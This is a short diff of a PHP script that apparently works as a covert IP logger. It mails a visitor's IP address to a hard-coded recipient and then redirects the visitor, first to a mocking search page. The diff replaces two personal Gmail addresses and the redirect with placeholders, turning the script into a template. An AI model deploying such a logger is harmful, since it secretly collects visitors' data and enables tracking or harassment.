@@ -21,8 +21,8 @@ $msg = ($ip_address);
 
 // send email
 
-$email_to = "durontomredul@gmail.com, setefenroberts@gmail.com";
+$email_to = "your email";
 mail($email_to,"My subject",$msg);
-header("Location: https://www.google.com/search?q=you+are+a+Equus+asinus");
+header("Location: https://www.your websiteg to redirect.com");
 exit();
 ?>
